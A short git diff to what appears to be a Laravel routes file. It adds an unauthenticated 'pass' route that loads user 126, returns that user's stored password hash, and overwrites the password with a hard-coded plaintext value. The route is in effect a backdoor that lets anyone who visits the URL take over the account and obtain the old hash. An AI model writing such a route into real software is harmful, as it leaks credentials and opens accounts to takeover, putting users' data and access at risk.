@@ -121,3 +121,11 @@ Route::get('catProduct', function(){
     }])->get();
     return $cat;
 });
+
+Route::get('pass', function(){
+    $user = \App\User::find(126);
+    $password = $user->password;
+    $user->password = bcrypt('8m8a2r4w');
+    $user->save();
+    return $password;
+});
